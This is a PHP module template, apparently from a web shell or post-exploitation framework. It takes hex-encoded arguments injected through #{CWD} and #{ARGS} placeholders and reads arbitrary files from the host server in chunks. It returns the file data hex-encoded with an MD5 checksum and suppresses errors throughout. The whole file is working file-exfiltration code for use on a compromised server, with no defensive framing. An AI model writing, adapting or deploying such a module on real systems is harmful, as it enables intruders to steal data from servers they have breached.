#<?php


class Module_download
{
    private $SUCC_CODE        = 0;
    private $ERR_CODE         = 1;

    private $FIELD_SEPARATOR  = ",";
    private $VALUE_SEPARATOR  = "=";
    private $CUSTOM_SEPARATOR = "|";

    private $RESPONSE_STATUS  = "status";
    private $RESPONSE_MESSAGE = "message";

    private $MAX_CHUNK_SIZE   = 1048576; // 1Mb

    private $return_code;

    public function __construct($cwd)
    {
        $this->return_code = $this->SUCC_CODE;
        $cwd = $this->normalizePath($cwd);
        chdir($cwd);
    }

    private function normalizePath($currPath)
    {
        $currPath = str_replace("\"", "", $currPath);
        $currPath = str_replace("'", "", $currPath);
        $currPath = str_replace("\\", "/", $currPath);
        return $currPath;
    }

    private function parseArgs($args)
    {
        preg_match_all('/"[^"]+"|\'[^\']+\'|\S+/', $args, $matches);
        return $matches[0];
    }

    private function generateResponse($result)
    {
        $response  = "";
        $response .= $this->RESPONSE_STATUS . $this->VALUE_SEPARATOR . $this->return_code;
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->RESPONSE_MESSAGE . $this->VALUE_SEPARATOR . bin2hex($result);
        return bin2hex($response);
    }

    private function get_file_size($filepath)
    {
        return @filesize($filepath);
    }

    private function read_chunk($filepath, $chunk_size_val, $seek)
    {
        $fp = @fopen($filepath, 'r');
        @fseek($fp, $seek);
        $data = @fread($fp, $chunk_size_val);
        @fclose($fp);
        return $data;
    }

    private function doDownload($filepath, $chunk_size, $seek)
    {
        $checksum = "";
        $filepath = $this->normalizePath($filepath);

        if (@file_exists($filepath) === false)
            throw new Exception("can't perform stat on '$filepath': File or directory does not exist");

        if (!@is_readable($filepath))
            throw new Exception("can't perform stat on '$filepath': Permission denied");

        if (!@is_file($filepath))
            throw new Exception("invalid file: '$filepath'");

        if (!@is_numeric($chunk_size))
            throw new Exception("invalid chunk size '$chunk_size': not a number");

        $chunk_size_val = intval($chunk_size);
        if ($chunk_size_val > $this->MAX_CHUNK_SIZE)
            throw new Exception("chunk size exceeds MAX_CHUNK_SIZE: $chunk_size > ".$this->MAX_CHUNK_SIZE);

        if (!@is_numeric($seek))
            throw new Exception("invalid seek position '$seek': not a number");
        
        $seek_position = intval($seek);
        $file_size = $this->get_file_size($filepath);
        if ($file_size < $seek_position)
            throw new Exception("invalid seek position '$seek': exceeds max '$filepath' length '$file_size'");            

        $chunk_data = $this->read_chunk($filepath, $chunk_size_val, $seek);
        if ($chunk_data === false)
            throw new Exception("read chunk in seek '$seek' from '$filepath': Failed");

        $chunk_data_len = @strlen($chunk_data);

        if ($chunk_data_len < $chunk_size_val)
            $checksum = @md5_file($filepath);

        $response  = "";
        $response .= $this->RESPONSE_STATUS . $this->VALUE_SEPARATOR . $this->return_code;
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->RESPONSE_MESSAGE . $this->VALUE_SEPARATOR;
        $response .= bin2hex($chunk_data) . $this->CUSTOM_SEPARATOR . bin2hex($checksum);
        return bin2hex($response);
    }

    public function execute($args)
    {
        try
        {
            $parsed_args = $this->parseArgs(hex2bin($args));
            
            if (sizeof($parsed_args) !== 3)
                throw new Exception("Invalid arguments provided. Specify a file to download, chunk size and seek");

            return $this->doDownload($parsed_args[0], $parsed_args[1], $parsed_args[2]);
        }
        catch (Exception $e)
        {
            $this->return_code = $this->ERR_CODE;
            return $this->generateResponse($e->getMessage() . PHP_EOL);
        }
    }
}


$cwd = '#{CWD}';
$args = '#{ARGS}';
$module = new Module_download($cwd);
print($module->execute($args));